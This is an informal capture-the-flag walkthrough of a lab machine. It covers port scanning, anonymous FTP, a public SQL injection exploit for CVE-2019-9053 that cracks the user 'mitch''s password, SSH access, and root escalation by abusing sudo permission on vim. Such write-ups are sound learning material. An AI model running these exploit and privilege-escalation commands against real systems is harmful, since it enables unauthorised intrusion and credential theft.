# Simple CTF

```jsx
─$ nmap -Pn -p- -T4 10.114.155.199
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2026-02-22 22:20 CET
Nmap scan report for 10.114.155.199
Host is up (0.25s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

lets try ftp

```jsx
ftp ip anonymous:anonymous
```

it connected 

under dir pub, ther is formitch.txt , it sounds like there is a user mitch with a weak password

also with gobuster i found /simple

so this machine uses a CMS called CMSimple , its has CVE-2019-9053 , known to be vulnerable to sqli , 

download the script from exploitd and then run 

 

```jsx
└─$ python2 cm.py -u http://10.114.155.199/simple --crack -w best110.txt
note: download the selist wordlist
sudo apt install seclists
or just the wordlist 
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/best110.txt

```

![image.png](image%208.png)

got this 

we got the user and the password hash , we need to crack that

i tied john to break the hash but i got nada

i we,t back and find this 

```jsx
└─$ python2 cm.py -u http://10.114.136.215/simple -c -w /usr/share/wordlists/rockyou.txt

+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@adminf
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
                               
```

than login in /simple and ssh 

```jsx
└─$ ssh mitch@10.114.136.215 -p 2222                                        

```

```jsx
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```

gonna use that for PE

vim -c ':redir! >/root/root.txt | echo "DATA" | redir END | q’

vim -c ':redir! >/root/root.txt | echo "DATA" | redir END | q’

for the next part first i did not find the vim suitable exploit , than i found two sites , i will see that later , for now i found what i need

[https://gtfobins.linuxsec.org](https://gtfobins.linuxsec.org/)

[https://gtfobins.org](https://gtfobins.org/)

![image.png](image%209.png)